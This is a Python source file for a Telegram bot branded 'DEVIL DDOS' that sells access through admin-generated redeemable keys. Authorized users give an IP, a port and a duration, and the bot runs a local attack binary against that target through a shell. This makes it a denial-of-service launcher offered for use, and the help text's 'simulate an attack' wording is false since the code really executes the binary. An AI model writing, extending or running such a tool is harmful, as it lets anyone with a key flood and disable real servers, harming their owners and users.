import logging
import asyncio
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import random
import string
from config import BOT_TOKEN, ADMIN_ID

# Logging setup
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Path to your binary
BINARY_PATH = "./DEVIL"  # Path where the attack binary resides

# Global variables
authorized_users = set()
valid_keys = set()

# Helper functions
def is_valid_ip(ip):
    """Validate an IP address."""
    import re
    pattern = re.compile(
        r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\."
        r"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\."
        r"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\."
        r"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    )
    return pattern.match(ip) is not None


def is_valid_port(port):
    """Validate a port number."""
    return port.isdigit() and 1 <= int(port) <= 65535


# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /start command."""
    user_id = update.effective_user.id
    if user_id in authorized_users or user_id == ADMIN_ID:
        await update.message.reply_text(
            "🔥 Welcome to DEVIL DDOS world 🔥\n\n"
            "Use /attack <ip> <port> <duration>\n"
            "Let the war begin! ⚔️💥"
        )
    else:
        await update.message.reply_text("❌ You are not authorized to use this bot!.")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /help command."""
    await update.message.reply_text(
        "Available commands:\n"
        "/start - Start the bot\n"
        "/help - Show this help message\n"
        "/genkey - Generate a key (Admin only)\n"
        "/redeem <key> - Redeem a key to gain access\n"
        "/attack <ip> <port> <duration> - Simulate an attack\n"
    )


async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /genkey command."""
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        valid_keys.add(key)
        logger.info(f"Generated key: {key}")
        await update.message.reply_text(f"Generated key: {key}")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /redeem command."""
    user_id = update.effective_user.id
    if context.args:
        key = context.args[0]
        if key in valid_keys:
            valid_keys.remove(key)
            authorized_users.add(user_id)
            logger.info(f"User {user_id} redeemed key successfully.")
            await update.message.reply_text("✅ Key redeemed successfully! You can now use the bot.")
        else:
            await update.message.reply_text("❌ Invalid or expired key.")
    else:
        await update.message.reply_text("⚠️ Usage: /redeem <key>")


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /attack command."""
    user_id = update.effective_user.id
    if user_id in authorized_users or user_id == ADMIN_ID:
        if len(context.args) == 3:
            target, port, duration = context.args

            if not is_valid_ip(target) or not is_valid_port(port):
                await update.message.reply_text("❌ Invalid IP address or port.")
                return

            try:
                duration = int(duration)
                if duration <= 0:
                    await update.message.reply_text("❌ Duration must be greater than zero.")
                    return

                await update.message.reply_text(
                    f"⚔️ Attack launched on {target}:{port} for {duration} seconds. Please wait for the result."
                )
                asyncio.create_task(run_attack(update, target, port, duration))
            except ValueError:
                await update.message.reply_text("❌ Invalid duration value.")
            except Exception as e:
                logger.error(f"Error in attack command: {e}")
                await update.message.reply_text(f"❌ An error occurred: {e}")
        else:
            await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
    else:
        await update.message.reply_text("❌ You are not authorized to use this command!")


async def run_attack(update, target, port, duration):
    """Run the attack in a separate task."""
    command = f"{BINARY_PATH} {target} {port} {duration} 200"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stderr:
            await update.message.reply_text(f"❌ Attack error: {stderr.decode()}")
        else:
            await update.message.reply_text(f"✅ Attack completed:\n{stdout.decode()}")
    except Exception as e:
        logger.error(f"Error while running attack: {e}")
        await update.message.reply_text(f"✅ Attack completed:\n{stdout.decode()}")


def main():
    """Main function to start the bot."""
    application = Application.builder().token(BOT_TOKEN).build()

    # Register command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("attack", attack))

    logger.info("Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()